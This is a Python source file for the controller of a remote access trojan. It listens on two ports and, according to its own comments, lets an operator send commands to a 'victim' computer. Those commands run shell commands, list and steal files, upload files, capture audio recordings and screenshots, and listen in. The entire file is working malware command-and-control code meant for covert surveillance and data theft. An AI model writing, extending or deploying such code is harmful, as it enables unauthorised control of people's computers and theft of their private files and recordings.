import socket
import threading


class Server:
    port = None
    ip = None
    listen_count = None
    client_name = ''

    def __init__(self, port, ip, listen_count, client_name):
        self.port = port
        self.ip = ip
        self.listen_count = listen_count
        self.client_name = client_name

    def startListen(self):
        self.s = socket.socket()
        self.s.bind((self.ip, self.port))
        self.s.listen(self.listen_count)
        self.server_socket, self.adress = self.s.accept()

    def runThread(self):
        self.startListen()
        self.server()

    def receive_file_from_client(self):

        # Take from the victim file
        file_path = input("Where do you want save the file?\n")

        with open(file_path, 'wb')as f:
            print('Open File')
            while True:
                data = self.server_socket.recv(1024)
                if not data or len(data) < 1024:
                    if data:
                        f.write(data)
                    f.flush()
                    f.close()
                    break
                f.write(data)
        print('done')

    def send_file_to_client(self, data):
        # Send to the victim files
        victim_path = input('Where do you want save the file\n')
        self.server_socket.sendall(victim_path.encode('utf-8'))
        f = open(data, 'rb')
        while True:
            content = f.read(1024)
            if content:
                self.server_socket.sendall(content)
            else:
                f.close()
                break

    def server(self):
        print("Connection from: " + str(self.adress))

        while True:
            print("test")
            command = input('Please enter a command to the victim\n')
            self.server_socket.send(command.encode('utf-8'))

            # recv file (file name on victim computer)
            if command.startswith('recv file'):
                self.receive_file_from_client()

            # for sending mcd commands to victim computer
            elif command.startswith("cmd"):
                data = self.server_socket.recv(2048)
                print(data.decode('utf-8', 'ignore'))


            elif command.startswith("get files"):
                data = self.server_socket.recv(20)
                try:
                    data = self.server_socket.recv(int(data.decode()))
                    print(data.decode())
                except:
                    print(data)


            elif command.startswith('download file '):
                command = command[14:-1] + command[-1]
                self.send_file_to_client(command)


            elif command.startswith('take record '):
                command = command[12:-1] + command[-1]
                self.server_socket.sendall(command.encode('utf-8'))
                path = input("Where do you want save the file on victim computer\n")
                self.server_socket.sendall(path.encode('utf-8'))
                self.receive_file_from_client()

            elif command.startswith('take screenshot '):
                self.receive_file_from_client()

            elif command == 'exit':
                break

            elif command.startswith('listen'):
                self.receive_file_from_client()

            elif command == 'exit':
                self.server_socket.close()
                break

            elif command == 'q':
                print("quitting")
                self.server_socket.close()
                return

            else:
                data = self.server_socket.recv(1024).decode('utf-8')
                print(data)

        self.server_socket.close()


myServer = Server(7613, '0.0.0.0', 1, 'client1')
myServer2 = Server(9999, '0.0.0.0', 1, 'client2')

t1 = threading.Thread(target=myServer.runThread, args=())
t2 = threading.Thread(target=myServer2.runThread, args=())

t1.start()
t2.start()

t1.join()
t2.join()
